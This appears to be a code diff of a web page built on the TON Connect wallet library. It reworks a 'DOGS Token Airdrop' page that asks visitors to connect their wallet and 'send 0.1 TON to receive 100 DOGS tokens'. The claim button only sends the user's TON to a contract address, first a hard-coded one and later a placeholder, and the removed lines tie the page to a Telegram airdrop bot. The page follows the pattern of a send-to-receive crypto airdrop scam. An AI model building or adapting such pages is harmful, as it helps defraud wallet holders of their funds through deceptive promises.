@@ -4,110 +4,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Connect Example 1</title>
+    <title>DOGS Token Airdrop</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@0.0.34/dist/tonconnect-sdk.min.js"></script>
     <style>
-        .center {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
         }
-
+        .container {
+            text-align: center;
+        }
+        .button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
         #status {
             margin-top: 20px;
             padding: 10px;
-            text-align: center;
-        }
-
-        #start-airdrop {
-            display: block;
-            margin: 20px auto;
-            padding: 10px 20px;
-            cursor: pointer;
+            border-radius: 4px;
         }
     </style>
 </head>
 
 <body>
-    <div class="center" id="ton-connect"></div>
-    <button id="start-airdrop">Rozpocznij AIRDROP 2</button>
-    <div id="status"></div>
+    <div class="container">
+        <h1>DOGS Token Airdrop</h1>
+        <p>Send 0.1 TON to receive 100 DOGS tokens</p>
+        <div id="ton-connect"></div>
+        <button id="claim-button" class="button" style="display: none;">Claim 100 DOGS</button>
+        <div id="status"></div>
+    </div>
 
     <script>
-        const AIRDROP_CONTRACT_ADDRESS = 'EQAj2hi6_JljnyupUJqqWduHyQ_74Uf23FcVQmdXy9KWVnQY'; // Twój adres kontraktu airdropa
-        const DOGS_TOKEN_ADDRESS = 'EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS'; // Podmień na właściwy adres kontraktu tokenu DOGS
+        const AIRDROP_CONTRACT_ADDRESS = 'YOUR_CONTRACT_ADDRESS';
 
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
+            manifestUrl: 'https://your-domain.com/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
 
-        tonConnectUI.uiOptions = {
-            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-        };
-
-        const startAirdropButton = document.getElementById('start-airdrop');
+        const claimButton = document.getElementById('claim-button');
         const statusDiv = document.getElementById('status');
 
+        // Obsługa zmiany statusu połączenia
         tonConnectUI.onStatusChange(async (wallet) => {
-            console.log('Wallet status:', wallet);
             if (wallet) {
-                startAirdropButton.style.display = 'block';
+                claimButton.style.display = 'inline-block';
                 statusDiv.textContent = 'Connected: ' + wallet.account.address;
             } else {
-                startAirdropButton.style.display = 'none';
-                statusDiv.textContent = 'Please connect your wallet first';
+                claimButton.style.display = 'none';
+                statusDiv.textContent = 'Please connect your wallet';
             }
         });
 
-        startAirdropButton.addEventListener('click', async () => {
+        // Obsługa kliknięcia przycisku claim
+        claimButton.addEventListener('click', async () => {
             try {
                 if (!tonConnectUI.connected) {
                     statusDiv.textContent = 'Please connect your wallet first';
                     return;
                 }
 
-                console.log('Sending transaction...');
-
-                // Przygotowanie transakcji
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 60,
                     messages: [
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: '200000000',
-                            payload: {
-                                abi: {
-                                    "type": "Contract",
-                                    "value": {
-                                        "name": "claim",
-                                        "inputs": []
-                                    }
-                                },
-                                text: "Claim airdrop"
-                            }
+                            amount: '100000000', // 0.1 TON
+                            payload: "Claim DOGS airdrop"
                         }
-                    ],
-                    from: tonConnectUI.wallet.account.address,
-                    network: tonConnectUI.network,
-                    params: {
-                        tokens: []
-                    }
+                    ]
                 };
 
-                statusDiv.textContent = 'Sending transaction...';
+                statusDiv.textContent = 'Confirming transaction...';
 
-                const result = await tonConnectUI.sendTransaction({
-                    messages: transaction.messages,
-                    validUntil: transaction.validUntil,
-                    from: transaction.from,
-                    network: transaction.network,
-                    params: transaction.params
-                });
-
+                const result = await tonConnectUI.sendTransaction(transaction);
                 console.log('Transaction result:', result);
-                statusDiv.textContent = 'Transaction sent Waiting for confirmation...';
+                
+                statusDiv.textContent = 'Transaction sent! Waiting for confirmation...';
+                
+                // Możesz dodać tu kod do śledzenia statusu transakcji
 
             } catch (error) {
                 console.error('Transaction error:', error);
@@ -115,15 +102,6 @@
             }
         });
 
-        async function checkInitialConnection() {
-            const wallet = await tonConnectUI.getConnectedWallet();
-            if (!wallet) {
-                startAirdropButton.style.display = 'none';
-                statusDiv.textContent = 'Please connect your wallet first';
-            }
-        }
-
-        checkInitialConnection();
     </script>
 </body>
 
